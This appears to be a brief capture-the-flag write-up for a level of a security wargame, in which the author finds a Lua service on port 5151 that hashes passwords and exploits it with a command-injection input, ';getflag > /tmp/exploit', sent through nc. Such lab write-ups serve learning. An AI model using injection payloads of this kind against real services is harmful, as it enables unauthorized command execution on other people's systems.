$> cat level11.lua

We see a port 5151 and a function called hash that takes a password and hash it

So we listened to port 5151 with nc like so:
$> nc localhost 5151
and we simply inputed:
$> Password: ;getflag > /tmp/exploit
to make the hash function execute and store the flag in /tmp/exploit aside from hashing it
